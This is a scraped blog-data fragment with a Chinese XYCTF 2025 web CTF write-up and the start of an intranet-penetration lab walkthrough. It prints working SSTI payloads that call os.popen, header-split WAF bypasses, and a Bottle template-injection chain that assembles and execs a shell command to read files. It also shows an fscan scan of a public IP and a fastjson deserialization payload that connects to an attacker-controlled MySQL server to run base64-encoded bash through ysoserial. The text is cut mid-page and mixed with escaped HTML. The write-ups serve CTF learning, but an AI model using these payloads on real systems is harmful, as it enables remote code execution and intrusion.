flask.request.args.get(\u0026#39;My_ins1de_w0r1d\u0026#39;) 50 if name: 51 try: 52 if name.startswith(\u0026#34;Follow-your-heart-\u0026#34;): 53 for i in lock_within: 54 if i in name: 55 return \u0026#39;NOPE.\u0026#39; 56 enable_hook = True 57 a = flask.render_template_string(\u0026#39;{#{name}#}\u0026#39;) 58 enable_hook = False 59 counter = 0 60 return a 61 else: 62 return \u0026#39;My inside world is always hidden.\u0026#39; 63 except RuntimeError as e: 64 counter = 0 65 return \u0026#39;NO.\u0026#39; 66 except Exception as e: 67 return \u0026#39;Error\u0026#39; 68 else: 69 return \u0026#39;Welcome to Hidden_route!\u0026#39; 70 71if __name__ == \u0026#39;__main__\u0026#39;: 72 import os 73 try: 74 import _posixsubprocess 75 del _posixsubprocess.fork_exec 76 except: 77 pass 78 import subprocess 79 del os.popen 80 del os.system 81 del subprocess.Popen 82 del subprocess.call 83 del subprocess.run 84 del subprocess.check_output 85 del subprocess.getoutput 86 del subprocess.getstatusoutput 87 del subprocess.PIPE 88 del subprocess.STDOUT 89 del subprocess.CalledProcessError 90 del subprocess.TimeoutExpired 91 del subprocess.SubprocessError 92 sys.addaudithook(audit_checker) 93 app.run(debug=False, host=\u0026#39;0.0.0.0\u0026#39;, port=5000) 很明显的 SSTI，我们需要绕过一些过滤，看了一下发现 config 没有被过滤，所以我们可以用它来写入键值。\n通过content-type传参来进行绕过waf\nPayload：\n1{{lipsum.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read()\u0026#34;)}} 1GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(lip=a|attr(request.mimetype)))%}{%23 HTTP/1.1 2Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080 3Content-Type: lipsum 4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 5Connection: close 6 7GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(gl=a.lip|attr(request.mimetype)))%}{%23 HTTP/1.1 8Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080 9Content-Type: __globals__ 10Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 11Connection: close 12 13GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(get=request.mimetype))%}{%23 HTTP/1.1 14Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080 15Content-Type: __getitem__ 16Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 17Connection: close 18 19GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(bui=request.mimetype))%}{%23 HTTP/1.1 20Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080 21Content-Type: __builtins__ 22Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 23Connection: close 24 25GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(ev=request.mimetype))%}{%23 HTTP/1.1 26Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080 27Content-Type: eval 28Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 29Connection: close 30 31GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.glb|attr(a.get)(a.bui)|attr(a.get)(a.ev)(request.mimetype))%}{%23 HTTP/1.1 32Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080 33Content-Type: __import__(\u0026#39;os\u0026#39;).popen(\u0026#39;mkdir static;cat /flag_h3r3 \u0026gt; static/flag\u0026#39;).read() 34Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 35Connection: close 访问/static/flag拿到flag\n‍\nNow you see me 2 这题跟上题打法一样，只是更换了传参的方式\n1GET /H3dden_route?spell=fly-%23}{%set%09a=config%}{%print(a.update(clss=a|attr(request.range.units)))%}{%23 HTTP/1.1 2Host: 127.0.0.1:5000 3Range: __class__=100-200 4Connection: close 拿到一张图片，用在线解密提取图片隐藏信息，无需密码\n1flag{__M@g1c1@ans_M@stering_M@g1c__} ‍\n出题人已疯 题目源码\n1# -*- encoding: utf-8 -*- 2\u0026#39;\u0026#39;\u0026#39; 3@File : app.py 4@Time : 2025/03/29 15:52:17 5@Author : LamentXU 6\u0026#39;\u0026#39;\u0026#39; 7import bottle 8\u0026#39;\u0026#39;\u0026#39; 9flag in /flag 10\u0026#39;\u0026#39;\u0026#39; 11@bottle.route(\u0026#39;/\u0026#39;) 12def index(): 13 return \u0026#39;Hello, World!\u0026#39; 14@bottle.route(\u0026#39;/attack\u0026#39;) 15def attack(): 16 payload = bottle.request.query.get(\u0026#39;payload\u0026#39;) 17 if payload and len(payload) \u0026lt; 25 and \u0026#39;open\u0026#39; not in payload and \u0026#39;\\\\\u0026#39; not in payload: 18 return bottle.template(\u0026#39;hello \u0026#39;+payload) 19 else: 20 bottle.abort(400, \u0026#39;Invalid payload\u0026#39;) 21if __name__ == \u0026#39;__main__\u0026#39;: 22 bottle.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) 用 import 加载模块，然后修改属性去实现变量持久化，从而去 RCE，然后可以用模板函数 include 去读文件\n1%0a%import+os;os.a=\u0026#39;__imp\u0026#39; 2%0a%import+os;os.b=\u0026#39;ort__\u0026#39; 3%0a%import+os;os.a%2B=os.b 4%0a%import+os;os.b=\u0026#39;(\u0026#34;os\u0026#34;\u0026#39; 5%0a%import+os;os.a%2B=os.b 6%0a%import+os;os.b=\u0026#39;).sys\u0026#39; 7%0a%import+os;os.a%2B=os.b 8%0a%import+os;os.b=\u0026#39;tem(\u0026#34;\u0026#39; 9%0a%import+os;os.a%2B=os.b 10%0a%import+os;os.b=\u0026#39;ca\u0026#39; 11%0a%import+os;os.a%2B=os.b 12%0a%import+os;os.b=\u0026#39;t+/f*\u0026#39; 13%0a%import+os;os.a%2B=os.b 14%0a%import+os;os.b=\u0026#39;\u0026gt;1\u0026#34;)\u0026#39; 15%0a%import+os;os.a%2B=os.b 16%0a%import+os;exec(os.a) 17 18%0a%import os;eval(os.a) 19%0a%include(\u0026#39;1\u0026#39;) ‍\nez_puzzle 非预期 查看puzzle.js，看到有一大段base64\ncyberchef转换一下\n发现是zlib\n看到一串hex\n反转一下转字符串就能拿到flag\n预期解 这题打开控制台会触发反调试\n右键从忽略列表中移除即可\n在代码中可以找到startTime和endTime，猜测应该是endTime-startTime来判断时间，所以直接在控制台给startTime赋一个大值\nstartTime=66666666666666 然后把拼图拼好即可拿到flag\n出题人又疯(复现) 聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass - LamentXU - 博客园\n这题主要是由于bottle框架中对编码检查的不严谨，所以可以利用python中会将exec执行的代码中的斜体字转换为对应的ASCII字符的特性来绕过waf。但是由于url编码问题，题目环境中只有o和a能够成功。\n详细的得看lamentxu师傅的博客。\n所以这题我们就可以把\n\u0026#39;o\u0026#39;替换为\u0026#39;%ba\u0026#39;, \u0026#39;a\u0026#39;替换为\u0026#39;%aa\u0026#39;, payload\n{{open(\u0026#39;/flag\u0026#39;).read()}} 替换 {\\{%bapen(\u0026#39;/flag\u0026#39;).read()}} //这里的\u0026#34;\\\u0026#34;是防止hugo报错加的，实际不需要 ","permalink":"http://localhost:1313/post/xyctf_2025/","summary":"\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"signin\"\u003e\u003cstrong\u003eSignin\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003e题目\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-Dockerfile\" data-lang=\"Dockerfile\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 1\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c\"\u003e# -*- encoding: utf-8 -*-\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 2\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 3\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e@File    :   main.py\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 4\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e@Time    :   2025/03/28 22:20:49\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 5\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e@Author  :   LamentXU \u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 6\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 7\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 8\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003eflag in /flag_\u003cspan class=\"o\"\u003e{\u003c/span\u003euuid4\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 9\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e10\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003efrom\u003c/span\u003e\u003cspan class=\"s\"\u003e bottle import Bottle, request, response, redirect, static_file, run, route\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e11\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003ewith open\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;../../secret.txt\u0026#39;\u003c/span\u003e, \u003cspan class=\"s1\"\u003e\u0026#39;r\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e as f:\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e12\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e    \u003cspan class=\"nv\"\u003esecret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e f.read\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e13\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e14\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e\u003cspan class=\"nv\"\u003eapp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e Bottle\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e15\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e@route\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;/\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e16\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003edef index\u003cspan class=\"o\"\u003e()\u003c/span\u003e:\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e17\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u0026#39;HI\u0026#39;\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e18\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e@route\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;/download\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e19\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003edef download\u003cspan class=\"o\"\u003e()\u003c/span\u003e:\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e20\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e    \u003cspan class=\"nv\"\u003ename\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e request.query.filename\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e21\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;../../\u0026#39;\u003c/span\u003e in name or name.startswith\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;/\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e or name.startswith\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;../\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e or \u003cspan class=\"s1\"\u003e\u0026#39;\\\\\u0026#39;\u003c/span\u003e in name:\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e22\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e        response.status \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e403\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e23\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Forbidden\u0026#39;\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e24\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e    with open\u003cspan class=\"o\"\u003e(\u003c/span\u003ename, \u003cspan class=\"s1\"\u003e\u0026#39;rb\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e as f:\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e25\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e        \u003cspan class=\"nv\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e f.read\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e26\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e data\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e27\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e28\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e@route\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;/secret\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e29\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003edef secret_page\u003cspan class=\"o\"\u003e()\u003c/span\u003e:\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e30\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e    try:\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e31\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e        \u003cspan class=\"nv\"\u003esession\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e request.get_cookie\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e, \u003cspan class=\"nv\"\u003esecret\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003esecret\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e32\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e not session or session\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;guest\u0026#34;\u003c/span\u003e:\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e33\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e            \u003cspan class=\"nv\"\u003esession\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;guest\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e34\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e            response.set_cookie\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e, session, \u003cspan class=\"nv\"\u003esecret\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003esecret\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e35\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Forbidden!\u0026#39;\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e36\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e session\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;admin\u0026#34;\u003c/span\u003e:\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e37\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;The secret has been deleted!\u0026#39;\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e38\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e    except:\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e39\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Error!\u0026#34;\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e40\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003erun\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003ehost\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0.0.0.0\u0026#39;\u003c/span\u003e, \u003cspan class=\"nv\"\u003eport\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e8080, \u003cspan class=\"nv\"\u003edebug\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eFalse\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e目录穿越拿secret\u003c/p\u003e","title":"XYCTF-2025-Web-Writeup"},{"content":"靶标介绍：\nExchange 是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 Flag，分布于不同的靶机。 *注意：该靶场只有4个flag，如果提交完4个flag后仍未攻克成功，请关闭环境提交反馈。\nFLAG1 首先用fscan信息收集一手\n1 .\\fscan.exe -h 39.98.127.105 -p 1-65535 2 3 ___ _ 4 / _ \\ ___ ___ _ __ __ _ ___| | __ 5 / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / 6/ /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; 7\\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ 8 fscan version: 1.8.1 9start infoscan 10(icmp) Target 39.98.127.105 is alive 11[*] Icmp alive hosts len is: 1 1239.98.127.105:80 open 1339.98.127.105:22 open 1439.98.127.105:8000 open 15[*] alive ports len is: 3 16start vulscan 17[*] WebTitle:http://39.98.127.105 code:200 len:19813 title:lumia 18[*] WebTitle:http://39.98.127.105:8000 code:302 len:0 title:None 跳转url: http://39.98.127.105:8000/login.html 19[*] WebTitle:http://39.98.127.105:8000/login.html code:200 len:5662 title:Lumia ERP 20已完成 3/3 21[*] 扫描结束,耗时: 5m26.1641278s 80端口是一个介绍产品的网站\n8000端口应该是网站的后台\n看到后台可以注册用户，我们注册一个\n成功进入后台\n华夏ERP v2.3存在一处fastjson反序列化漏洞\nJava 代码审计之华夏 ERP CMS v2.3 - FreeBuf网络安全行业门户\nFastjson版本是 1.2.55\n构造dns请求验证一下\n{\u0026#34;@type\u0026#34;:\u0026#34;java.net.Inet4Address\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;ysgbayuskh.iyhc.eu.org\u0026#34;} 验证漏洞\n这里我们可以通过evil-mysql-server和ysoserial构造恶意mysql服务打jdbc\n./evil-mysql-server -addr 3366 -java java -ysoserial ysoserial-all.jar exp\n{\r\u0026#34;name\u0026#34;: {\r\u0026#34;@type\u0026#34;: \u0026#34;java.lang.AutoCloseable\u0026#34;,\r\u0026#34;@type\u0026#34;: \u0026#34;com.mysql.jdbc.JDBC4Connection\u0026#34;,\r\u0026#34;hostToConnectTo\u0026#34;: \u0026#34;vpsIP地址\u0026#34;,\r\u0026#34;portToConnectTo\u0026#34;: 3366,\r\u0026#34;info\u0026#34;: {\r\u0026#34;user\u0026#34;: \u0026#34;yso_CommonsCollections6_bash -c {echo,base64编码后的命令}|{base64,-d}|{bash,-i}\u0026#34;,\r\u0026#34;password\u0026#34;: \u0026#34;pass\u0026#34;,\r\u0026#34;statementInterceptors\u0026#34;: \u0026#34;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\u0026#34;,\r\u0026#34;autoDeserialize\u0026#34;: \u0026#34;true\u0026#34;,\r\u0026#34;NUM_HOSTS\u0026#34;: \u0026#34;1\u0026#34;\r}\r} 